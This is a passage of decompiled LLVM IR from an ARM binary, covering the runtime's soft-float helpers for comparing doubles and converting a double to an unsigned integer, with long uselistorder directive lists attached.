  uselistorder i32 ()* @function_1ab78, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1ab74 = load i32, i32* @r0, align 4
  ret i32 %v0_1ab74
}

define i32 @function_1ab78() local_unnamed_addr {
dec_label_pc_1ab78:
  %v0_1ab78 = load i32, i32* @ip, align 4
  %v0_1ab7c = load i32, i32* @r1, align 4
  %v2_1ab7c = mul i32 %v0_1ab7c, 2
  %v2_1ab7c.off = add i32 %v2_1ab7c, 4194303
  %tmp = icmp ult i32 %v2_1ab7c.off, 2097152
  %v0_1ab84 = load i32, i32* @r3, align 4
  %v2_1ab84 = mul i32 %v0_1ab84, 2
  br i1 %tmp, label %dec_label_pc_1abd4, label %bb

bb:                                               ; preds = %dec_label_pc_1ab78
  %v2_1ab84.off = add i32 %v2_1ab84, 4194303
  %tmp21 = icmp ult i32 %v2_1ab84.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1abc8, label %dec_label_pc_1ab90

dec_label_pc_1ab90:                               ; preds = %dec_label_pc_1abdc, %dec_label_pc_1abe8, %bb
  %v0_1ab90 = load i32, i32* @r0, align 4
  %v4_1ab90 = or i32 %v0_1ab90, %v2_1ab7c
  %v6_1ab90 = icmp eq i32 %v4_1ab90, 0
  br i1 %v6_1ab90, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1ab90
  %v1_1ab94 = load i32, i32* @r2, align 4
  %v5_1ab94 = or i32 %v1_1ab94, %v2_1ab84
  %v7_1ab94 = icmp eq i32 %v5_1ab94, 0
  br i1 %v7_1ab94, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1ab90, %bb10
  %v5_1ab98 = icmp eq i32 %v0_1ab84, %v0_1ab7c
  br i1 %v5_1ab98, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1ab9c.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1ab9c = phi i32 [ %v2_1ab9c.pre, %.thread..thread1_crit_edge ], [ %v1_1ab94, %bb10 ]
  %v5_1ab9c = icmp eq i32 %v2_1ab9c, %v0_1ab90
  br i1 %v5_1ab9c, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1aba4 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1aba4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1aba4, i32 %v0_1aba4)
  %v0_1aba8 = load i32, i32* @r0, align 4
  %v0_1abac = load i32, i32* @r1, align 4
  %v1_1abac = load i32, i32* @r3, align 4
  %v2_1abac = xor i32 %v1_1abac, %v0_1abac
  %v3_1abac = icmp slt i32 %v2_1abac, 0
  br i1 %v3_1abac, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1abb0 = icmp eq i32 %v0_1abac, %v1_1abac
  br i1 %v10_1abb0, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1abb4 = load i32, i32* @r2, align 4
  %v4_1abb4 = icmp ult i32 %v0_1aba8, %v2_1abb4
  br i1 %v4_1abb4, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1abb0 = icmp ult i32 %v0_1abac, %v1_1abac
  br i1 %v4_1abb0, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1abac, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1abb8 = and i32 %v1_1abac, 1073741824
  %v3_1abb8 = icmp eq i32 %v2_1abb8, 0
  %v4_1abb8 = ashr i32 %v1_1abac, 31
  br i1 %v3_1abb8, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1abbc.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1abb8, %bb15 ]
  %v5_1abbc = sub nsw i32 -1, %v4_1abbc.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1abc0 = phi i32 [ %v4_1abb8, %bb15 ], [ %v5_1abbc, %.thread3 ]
  %v1_1abc0 = or i32 %v0_1abc0, 1
  ret i32 %v1_1abc0

dec_label_pc_1abc8:                               ; preds = %bb
  br label %dec_label_pc_1abdc

dec_label_pc_1abd4:                               ; preds = %dec_label_pc_1ab78
  %v0_1abd4 = load i32, i32* @r0, align 4
  %v4_1abd4 = mul i32 %v0_1ab7c, 4096
  %v5_1abd4 = or i32 %v0_1abd4, %v4_1abd4
  %v7_1abd4 = icmp eq i32 %v5_1abd4, 0
  br i1 %v7_1abd4, label %dec_label_pc_1abd4.dec_label_pc_1abdc_crit_edge, label %dec_label_pc_1abf0

dec_label_pc_1abd4.dec_label_pc_1abdc_crit_edge:  ; preds = %dec_label_pc_1abd4
  %v2_1ab84.off20 = add i32 %v2_1ab84, 4194303
  %tmp22 = icmp ult i32 %v2_1ab84.off20, 2097152
  br label %dec_label_pc_1abdc

dec_label_pc_1abdc:                               ; preds = %dec_label_pc_1abd4.dec_label_pc_1abdc_crit_edge, %dec_label_pc_1abc8
  %v3_1abe0.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1abd4.dec_label_pc_1abdc_crit_edge ], [ true, %dec_label_pc_1abc8 ]
  br i1 %v3_1abe0.pre-phi, label %dec_label_pc_1abe8, label %dec_label_pc_1ab90

dec_label_pc_1abe8:                               ; preds = %dec_label_pc_1abdc
  %v0_1abe8 = load i32, i32* @r2, align 4
  %v4_1abe8 = mul i32 %v0_1ab84, 4096
  %v5_1abe8 = or i32 %v0_1abe8, %v4_1abe8
  %v7_1abe8 = icmp eq i32 %v5_1abe8, 0
  br i1 %v7_1abe8, label %dec_label_pc_1ab90, label %dec_label_pc_1abf0

dec_label_pc_1abf0:                               ; preds = %dec_label_pc_1abd4, %dec_label_pc_1abe8
  ret i32 %v0_1ab78

; uselistorder directives
  uselistorder i32 %v4_1abb8, { 1, 0 }
  uselistorder i32 %v1_1abac, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1abac, { 2, 1, 0 }
  uselistorder i32 %v1_1ab94, { 1, 0 }
  uselistorder i32 %v2_1ab84, { 0, 2, 1 }
  uselistorder i32 %v0_1ab84, { 1, 0, 2 }
  uselistorder i32 %v2_1ab7c, { 1, 0 }
  uselistorder i32 %v0_1ab7c, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 10, 4, 2, 5, 6, 11, 3, 18, 12, 7, 8, 1, 13, 0, 14, 15, 16, 17, 9 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 6, 4, 5, 7, 8, 9, 10, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 47, 48, 49, 57, 58, 59, 41, 11, 17, 64, 55, 42, 44, 69, 74, 72, 73, 71, 65, 66, 13, 14, 67, 68, 70, 61, 62, 53, 15, 56, 16, 43, 0, 54, 12, 50, 51, 52, 60, 63, 1, 2, 3 }
  uselistorder i32* @r3, { 25, 26, 16, 17, 27, 28, 7, 29, 30, 31, 32, 49, 50, 51, 52, 53, 54, 55, 56, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 2, 81, 6, 18, 20, 21, 83, 84, 103, 104, 3, 105, 106, 107, 4, 108, 109, 110, 5, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 0, 129, 130, 131, 132, 33, 34, 92, 93, 94, 35, 36, 37, 38, 39, 40, 19, 133, 139, 140, 141, 137, 57, 58, 59, 96, 97, 95, 60, 41, 42, 98, 99, 100, 101, 102, 9, 10, 11, 145, 142, 143, 144, 1, 146, 147, 148, 43, 44, 64, 22, 65, 66, 67, 68, 45, 46, 69, 138, 61, 62, 63, 134, 135, 136, 23, 24, 47, 48, 12, 13, 14, 15, 85, 86, 87, 88, 89, 90, 91, 8 }
  uselistorder i32* @r1, { 71, 72, 12, 73, 74, 75, 76, 77, 13, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 33, 34, 14, 35, 36, 89, 1, 90, 91, 92, 93, 94, 95, 96, 11, 97, 98, 99, 100, 125, 15, 126, 127, 128, 131, 16, 17, 132, 133, 134, 135, 136, 137, 140, 141, 142, 143, 144, 147, 155, 156, 157, 158, 161, 162, 163, 8, 37, 38, 164, 165, 148, 101, 39, 41, 166, 167, 173, 174, 129, 64, 149, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 19, 130, 0, 40, 42, 20, 32, 189, 138, 139, 2, 145, 146, 3, 4, 185, 43, 21, 22, 23, 24, 175, 176, 31, 183, 5, 180, 181, 182, 150, 151, 152, 113, 114, 115, 25, 26, 168, 169, 170, 171, 172, 6, 159, 160, 9, 179, 27, 18, 7, 116, 117, 118, 10, 119, 120, 121, 28, 153, 154, 122, 123, 186, 187, 29, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 65, 66, 67, 68, 69, 70, 124, 177, 178, 184, 30, 188 }
  uselistorder i32* @ip, { 28, 20, 21, 22, 29, 30, 31, 32, 33, 34, 35, 70, 71, 72, 73, 74, 80, 81, 83, 84, 85, 86, 87, 88, 89, 90, 98, 1, 106, 105, 115, 116, 117, 118, 119, 120, 121, 122, 123, 125, 126, 124, 127, 10, 128, 11, 129, 130, 131, 132, 36, 37, 2, 38, 23, 82, 133, 134, 135, 149, 77, 78, 14, 40, 39, 6, 41, 42, 7, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 12, 188, 189, 190, 191, 192, 193, 194, 195, 196, 79, 43, 44, 45, 46, 47, 197, 91, 92, 3, 93, 94, 95, 96, 97, 15, 16, 17, 18, 151, 13, 99, 100, 101, 102, 103, 104, 152, 153, 150, 110, 111, 48, 75, 76, 154, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 50, 49, 8, 201, 198, 199, 200, 9, 202, 107, 0, 25, 108, 4, 109, 26, 5, 27, 52, 53, 54, 55, 56, 57, 58, 59, 51, 60, 61, 62, 63, 64, 65, 66, 67, 24, 112, 113, 114, 68, 69, 19 }
  uselistorder label %dec_label_pc_1abf0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1ab90, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1abf8 = load i32, i32* @r0, align 4
  %v0_1abfc = load i32, i32* @r2, align 4
  store i32 %v0_1abfc, i32* @r0, align 4
  store i32 %v0_1abf8, i32* @r2, align 4
  %v0_1ac10 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1ac10
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1ac14 = load i32, i32* @r0, align 4
  %v1_1ac18 = sext i32 %v3_1ac14 to i64
  %v2_1ac18 = bitcast i64 %v1_1ac18 to double
  %v3_1ac18 = load i32, i32* @r2, align 4
  %v4_1ac18 = sext i32 %v3_1ac18 to i64
  %v5_1ac18 = bitcast i64 %v4_1ac18 to double
  %v7_1ac18 = fcmp oeq double %v2_1ac18, %v5_1ac18
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1ac18 = fcmp ule double %v2_1ac18, %v5_1ac18
  %not.v7_1ac18 = xor i1 %v7_1ac18, true
  %v1_1ac1c = and i1 %not.v6_1ac18, %not.v7_1ac18
  store i1 %v7_1ac18, i1* @cpsr_z, align 1
  br i1 %v1_1ac1c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1ac18, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1ac14

; uselistorder directives
  uselistorder i1 %v7_1ac18, { 1, 2, 0 }
  uselistorder i32* @r2, { 13, 44, 45, 46, 47, 2, 48, 49, 50, 51, 52, 53, 10, 54, 93, 94, 98, 11, 100, 101, 102, 103, 104, 112, 119, 120, 121, 122, 123, 124, 17, 125, 126, 127, 55, 56, 20, 99, 18, 19, 97, 128, 129, 130, 12, 33, 9, 145, 146, 147, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 137, 67, 68, 69, 70, 95, 96, 148, 149, 154, 155, 156, 157, 1, 160, 150, 105, 106, 107, 108, 109, 3, 151, 4, 5, 110, 111, 6, 7, 138, 114, 71, 72, 73, 74, 34, 86, 113, 0, 158, 8, 159, 75, 76, 77, 79, 78, 80, 81, 82, 83, 115, 116, 117, 84, 85, 118, 152, 153, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 37, 38, 39, 40, 41, 42, 43, 87, 88, 14, 15, 16, 89, 90, 91, 92, 131, 132, 133, 134, 135, 136, 139, 140, 141, 142, 143, 144 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1ac30 = call i32 @__aeabi_cdcmple()
  %v0_1ac34 = load i1, i1* @cpsr_z, align 1
  %.v0_1ac30. = zext i1 %v0_1ac34 to i32
  ret i32 %.v0_1ac30.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1ac48 = call i32 @__aeabi_cdcmple()
  %v0_1ac4c = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1ac4c to i32
  %.v0_1ac48. = xor i32 %tmp2, 1
  ret i32 %.v0_1ac48.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_1ac60 = call i32 @__aeabi_cdcmple()
  %v0_1ac64 = load i1, i1* @cpsr_z, align 1
  %v1_1ac64 = load i1, i1* @cpsr_c, align 1
  %v2_1ac64 = xor i1 %v1_1ac64, true
  %v3_1ac64 = or i1 %v0_1ac64, %v2_1ac64
  %.v0_1ac60 = select i1 %v3_1ac64, i32 1, i32 %v0_1ac60
  %v2_1ac68 = xor i1 %v0_1ac64, true
  %v3_1ac68 = and i1 %v1_1ac64, %v2_1ac68
  %..v0_1ac60 = select i1 %v3_1ac68, i32 0, i32 %.v0_1ac60
  ret i32 %..v0_1ac60

; uselistorder directives
  uselistorder i1 %v1_1ac64, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1ac74 = load i32, i32* @lr, align 4
  store i32 %v0_1ac74, i32* %stack_var_-8, align 4
  %v0_1ac78 = call i32 @__aeabi_cdrcmple()
  %v0_1ac7c = load i1, i1* @cpsr_z, align 1
  %v1_1ac7c = load i1, i1* @cpsr_c, align 1
  %v2_1ac7c = xor i1 %v1_1ac7c, true
  %v3_1ac7c = or i1 %v0_1ac7c, %v2_1ac7c
  %.v0_1ac78 = select i1 %v3_1ac7c, i32 1, i32 %v0_1ac78
  %v2_1ac80 = xor i1 %v0_1ac7c, true
  %v3_1ac80 = and i1 %v1_1ac7c, %v2_1ac80
  %..v0_1ac78 = select i1 %v3_1ac80, i32 0, i32 %.v0_1ac78
  %v2_1ac84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1ac84, i32* @lr, align 4
  ret i32 %..v0_1ac78

; uselistorder directives
  uselistorder i1 %v1_1ac7c, { 1, 0 }
  uselistorder i1 true, { 3, 4, 5, 6, 0, 101, 1, 92, 7, 8, 9, 10, 11, 12, 84, 85, 93, 94, 86, 13, 14, 15, 87, 88, 89, 95, 16, 17, 18, 19, 22, 21, 20, 103, 104, 105, 106, 107, 108, 109, 90, 110, 111, 112, 97, 113, 114, 115, 116, 91, 117, 118, 119, 120, 121, 122, 123, 23, 124, 102, 125, 24, 25, 26, 27, 98, 30, 31, 32, 33, 28, 29, 99, 34, 100, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 96, 126, 63, 64, 65, 66, 2, 67, 68, 82, 69, 70, 71, 72, 83, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i1* @cpsr_z, { 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 0, 1, 2, 3, 4, 5, 6, 7, 44, 8, 9, 10, 11, 12, 13, 14, 15, 40, 41, 42, 43, 16, 17, 18, 19, 39, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* @lr, { 22, 23, 24, 25, 26, 7, 8, 9, 10, 11, 27, 0, 28, 1, 29, 30, 31, 55, 56, 60, 61, 62, 66, 67, 68, 69, 70, 71, 72, 73, 76, 86, 87, 80, 88, 89, 90, 91, 92, 93, 94, 95, 12, 96, 97, 98, 106, 99, 100, 101, 102, 103, 104, 105, 32, 63, 64, 65, 21, 134, 135, 136, 137, 138, 139, 140, 141, 142, 81, 82, 57, 58, 59, 33, 34, 35, 36, 37, 38, 39, 40, 41, 54, 13, 14, 113, 114, 115, 16, 17, 52, 53, 109, 143, 144, 116, 117, 118, 119, 120, 77, 78, 79, 121, 122, 123, 124, 125, 126, 127, 2, 128, 129, 131, 132, 130, 107, 108, 18, 19, 20, 83, 84, 85, 42, 43, 44, 45, 46, 47, 3, 4, 48, 49, 50, 51, 15, 74, 75, 112, 133, 5, 6, 110, 111 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1ac90 = call i32 @__aeabi_cdrcmple()
  %v0_1ac94 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1ac94 to i32
  %.v0_1ac90. = xor i32 %tmp2, 1
  ret i32 %.v0_1ac90.

; uselistorder directives
  uselistorder i32 1, { 577, 590, 685, 591, 578, 1057, 1002, 1058, 686, 154, 157, 156, 160, 159, 155, 161, 158, 1059, 687, 1060, 688, 47, 49, 45, 46, 48, 409, 153, 152, 548, 162, 689, 410, 411, 1061, 1062, 33, 32, 1063, 429, 430, 431, 690, 150, 151, 146, 147, 148, 149, 1123, 503, 1124, 1130, 601, 1131, 1132, 691, 37, 38, 39, 36, 42, 40, 41, 692, 145, 144, 1133, 602, 603, 1136, 1150, 695, 694, 693, 414, 413, 415, 412, 1152, 696, 34, 35, 1153, 549, 1154, 1155, 697, 99, 100, 1156, 698, 31, 233, 232, 241, 1157, 700, 699, 261, 260, 259, 701, 252, 604, 1158, 1159, 1160, 520, 1161, 584, 550, 1162, 1163, 523, 1164, 1165, 704, 703, 702, 418, 417, 419, 416, 705, 422, 421, 420, 1166, 1167, 1168, 1177, 1178, 1179, 1186, 605, 606, 714, 713, 712, 711, 684, 710, 709, 708, 707, 706, 424, 425, 427, 426, 428, 423, 1189, 715, 383, 381, 382, 384, 579, 1214, 1215, 572, 1216, 1218, 504, 1219, 608, 568, 567, 607, 1220, 515, 532, 565, 585, 1221, 1222, 1223, 1224, 1225, 0, 1228, 1217, 609, 1229, 574, 723, 675, 722, 721, 720, 719, 718, 717, 716, 337, 336, 334, 335, 1230, 1231, 1232, 1233, 1234, 505, 1235, 724, 377, 374, 376, 372, 371, 373, 378, 375, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 551, 1011, 1012, 728, 727, 726, 725, 367, 368, 369, 370, 1013, 1014, 1015, 1016, 1017, 731, 730, 729, 290, 285, 289, 292, 288, 287, 286, 284, 293, 291, 552, 1236, 553, 1237, 1238, 1239, 1240, 1, 1241, 1242, 1243, 1244, 1245, 1246, 733, 732, 213, 212, 215, 216, 211, 217, 214, 592, 1247, 1248, 1249, 1250, 1251, 734, 405, 404, 406, 408, 407, 1190, 735, 432, 433, 434, 736, 333, 737, 179, 181, 180, 182, 738, 308, 307, 309, 1064, 1065, 1066, 739, 437, 439, 438, 435, 436, 740, 123, 124, 121, 127, 125, 122, 126, 130, 135, 129, 134, 138, 137, 133, 136, 131, 132, 741, 86, 85, 83, 82, 84, 80, 81, 742, 167, 168, 175, 176, 172, 173, 171, 174, 169, 170, 440, 275, 274, 267, 266, 554, 1252, 1253, 1272, 1273, 744, 743, 163, 165, 166, 164, 524, 573, 525, 1310, 1311, 1312, 1313, 555, 745, 183, 1045, 1046, 43, 44, 533, 1137, 1379, 1138, 1139, 1140, 534, 1047, 1142, 1141, 511, 746, 1048, 747, 442, 443, 444, 441, 1067, 535, 1068, 1381, 536, 1382, 1383, 1384, 1385, 1386, 1387, 987, 1388, 1389, 1390, 1391, 1392, 1393, 988, 676, 749, 748, 90, 91, 96, 98, 97, 92, 89, 93, 95, 94, 610, 1191, 1192, 1198, 1199, 750, 677, 87, 88, 1143, 1144, 751, 185, 184, 537, 556, 1069, 1070, 1071, 611, 1072, 521, 557, 516, 538, 1073, 612, 1074, 1075, 1076, 2, 1077, 509, 1078, 506, 1079, 613, 1080, 1081, 1082, 558, 1083, 764, 763, 762, 761, 760, 759, 758, 757, 756, 755, 754, 753, 678, 752, 347, 356, 346, 348, 359, 351, 349, 352, 350, 357, 358, 354, 353, 355, 360, 1297, 1298, 340, 338, 343, 345, 341, 342, 339, 344, 210, 517, 765, 326, 327, 766, 128, 1193, 1194, 1195, 767, 117, 119, 118, 120, 114, 113, 115, 116, 1084, 769, 768, 104, 106, 105, 107, 109, 108, 559, 586, 772, 771, 770, 614, 1151, 773, 230, 1145, 1146, 1147, 1148, 1149, 615, 774, 59, 62, 60, 61, 63, 616, 50, 1018, 775, 142, 617, 776, 143, 618, 777, 141, 139, 140, 778, 388, 387, 386, 779, 325, 324, 280, 780, 312, 781, 329, 328, 782, 229, 227, 228, 783, 255, 784, 302, 301, 785, 445, 786, 446, 787, 270, 788, 789, 313, 314, 1394, 619, 1395, 1396, 620, 790, 55, 51, 56, 54, 52, 57, 58, 53, 364, 621, 331, 330, 791, 447, 448, 449, 792, 1323, 1324, 795, 794, 793, 279, 361, 518, 999, 1000, 1001, 796, 1022, 799, 798, 797, 251, 800, 526, 1172, 527, 1173, 1174, 519, 1175, 451, 452, 450, 453, 455, 454, 456, 1176, 528, 1019, 64, 67, 66, 65, 68, 1125, 560, 1126, 802, 801, 72, 70, 69, 76, 74, 75, 73, 71, 803, 19, 21, 17, 15, 16, 18, 20, 804, 22, 27, 23, 26, 25, 28, 24, 805, 806, 1397, 561, 622, 808, 807, 809, 1327, 1330, 1331, 1332, 810, 457, 462, 463, 461, 460, 464, 458, 459, 1333, 1334, 1335, 1336, 811, 469, 475, 468, 474, 473, 467, 477, 476, 471, 465, 470, 466, 472, 1328, 1329, 623, 281, 283, 282, 1180, 624, 1181, 1182, 1183, 1184, 1185, 812, 187, 188, 186, 189, 1337, 1338, 1339, 1340, 1341, 1342, 580, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 626, 1351, 1352, 1353, 1354, 1355, 625, 1356, 1357, 1358, 1359, 1360, 813, 394, 396, 392, 395, 400, 402, 399, 401, 403, 397, 398, 393, 390, 389, 627, 628, 1023, 522, 817, 816, 815, 814, 277, 190, 539, 273, 818, 192, 191, 295, 819, 276, 820, 306, 821, 294, 365, 822, 311, 310, 823, 366, 824, 825, 1299, 1300, 827, 826, 478, 479, 1205, 828, 1290, 1291, 3, 177, 1085, 1086, 829, 480, 1134, 1135, 540, 1380, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 830, 298, 296, 297, 299, 300, 1226, 1227, 110, 111, 541, 1087, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 10, 1188, 1187, 989, 990, 991, 992, 993, 994, 995, 1398, 11, 12, 13, 14, 178, 629, 831, 1203, 1200, 1201, 1202, 569, 542, 317, 315, 316, 319, 318, 1197, 832, 222, 224, 225, 226, 223, 630, 1196, 834, 833, 484, 482, 485, 481, 483, 486, 1024, 835, 320, 1204, 836, 265, 264, 263, 1025, 837, 220, 219, 221, 218, 575, 1088, 1089, 632, 1090, 1091, 1092, 1093, 1094, 633, 1095, 1096, 1097, 1098, 1099, 634, 1101, 563, 562, 1100, 631, 1102, 1103, 635, 1104, 1105, 1106, 842, 679, 841, 840, 839, 838, 198, 196, 197, 201, 205, 195, 202, 203, 199, 204, 200, 1107, 843, 488, 492, 490, 491, 487, 489, 543, 844, 238, 237, 1108, 1109, 1110, 208, 209, 206, 207, 576, 510, 1112, 1113, 529, 1114, 1115, 4, 5, 1116, 1118, 512, 1119, 637, 1120, 530, 1117, 636, 854, 853, 852, 851, 850, 849, 848, 847, 846, 845, 101, 103, 102, 638, 544, 855, 77, 78, 79, 1111, 587, 680, 856, 493, 1020, 857, 244, 243, 245, 248, 246, 242, 247, 639, 1021, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 545, 860, 859, 858, 495, 494, 498, 497, 496, 499, 564, 862, 861, 863, 1169, 1170, 1171, 865, 864, 29, 30, 866, 322, 321, 867, 235, 385, 868, 256, 869, 500, 870, 258, 257, 305, 304, 240, 239, 871, 250, 249, 872, 262, 873, 874, 254, 253, 875, 231, 272, 876, 501, 236, 877, 878, 194, 193, 879, 271, 880, 363, 362, 507, 1361, 269, 268, 1026, 513, 531, 1027, 1028, 1029, 508, 642, 1030, 1031, 1032, 581, 1033, 1034, 1035, 1036, 1037, 640, 641, 582, 643, 1038, 887, 886, 885, 884, 883, 882, 881, 1039, 1040, 894, 893, 892, 891, 890, 681, 889, 888, 644, 1041, 1042, 896, 895, 1043, 1044, 645, 646, 897, 1049, 1050, 647, 903, 902, 901, 900, 899, 898, 278, 1051, 1052, 648, 1053, 1054, 1055, 1056, 909, 908, 907, 906, 905, 904, 323, 1121, 913, 912, 911, 910, 1122, 918, 917, 916, 915, 914, 1127, 649, 996, 997, 652, 998, 650, 651, 986, 1128, 1129, 927, 926, 925, 924, 923, 922, 921, 920, 919, 380, 379, 653, 654, 655, 931, 930, 929, 928, 593, 1274, 932, 935, 934, 933, 6, 656, 570, 937, 936, 588, 1282, 657, 658, 1284, 1283, 659, 940, 939, 938, 594, 1285, 1286, 660, 661, 662, 1292, 682, 1287, 663, 941, 589, 664, 665, 1288, 666, 1289, 949, 948, 947, 946, 945, 944, 943, 942, 595, 1293, 1294, 596, 950, 951, 1295, 667, 1296, 954, 953, 952, 956, 955, 957, 566, 1301, 1302, 1303, 668, 514, 1304, 1305, 1306, 669, 1307, 961, 960, 959, 958, 683, 1308, 391, 1309, 112, 598, 1314, 1315, 597, 1316, 1317, 599, 600, 1318, 1319, 962, 1320, 7, 8, 1322, 1321, 670, 965, 964, 963, 671, 1325, 1326, 967, 966, 970, 969, 968, 973, 972, 971, 975, 974, 1362, 1363, 672, 1372, 1373, 571, 1374, 977, 976, 583, 9, 981, 980, 979, 978, 547, 1364, 1365, 1366, 546, 1367, 1370, 1371, 673, 982, 674, 1368, 1369, 983, 332, 1375, 1376, 234, 1377, 1378, 303, 984, 985, 502 }
  uselistorder i1 false, { 37, 13, 14, 11, 15, 50, 51, 52, 53, 54, 55, 8, 9, 12, 56, 57, 58, 10, 38, 35, 39, 40, 41, 42, 43, 3, 16, 17, 36, 1, 30, 59, 0, 21, 22, 23, 44, 18, 20, 45, 46, 47, 48, 49, 32, 2, 5, 60, 19, 24, 27, 26, 25, 28, 6, 7, 29, 4, 34, 31, 33, 61, 62, 63, 64 }
  uselistorder i1* @cpsr_c, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1aca4 = icmp slt i32 %arg2, 0
  %v2_1aca4 = mul i32 %arg2, 2
  br i1 %v1_1aca4, label %dec_label_pc_1acd8, label %dec_label_pc_1acac

dec_label_pc_1acac:                               ; preds = %entry
  %v1_1acac = add i32 %v2_1aca4, 2097152
  %v2_1acac = icmp ugt i32 %v2_1aca4, -2097153
  br i1 %v2_1acac, label %dec_label_pc_1ace0, label %dec_label_pc_1acb4

dec_label_pc_1acb4:                               ; preds = %dec_label_pc_1acac
  %v6_1acac = icmp slt i32 %v1_1acac, 0
  br i1 %v6_1acac, label %dec_label_pc_1acb8, label %dec_label_pc_1acd8

dec_label_pc_1acb8:                               ; preds = %dec_label_pc_1acb4
  %v4_1acbc = sdiv i32 %v1_1acac, 2097152
  %v5_1acbc = sub nsw i32 -993, %v4_1acbc
  %v11_1acbc = icmp slt i32 %v5_1acbc, 0
  br i1 %v11_1acbc, label %dec_label_pc_1ace8, label %dec_label_pc_1acc4

dec_label_pc_1acc4:                               ; preds = %dec_label_pc_1acb8
  %v3_1acc4 = mul i32 %arg2, 2048
  %v4_1accc = udiv i32 %arg1, 2097152
  %v1_1acc8 = or i32 %v4_1accc, %v3_1acc4
  %v5_1accc = or i32 %v1_1acc8, -2147483648
  %v6_1acd0 = lshr i32 %v5_1accc, %v5_1acbc
  ret i32 %v6_1acd0

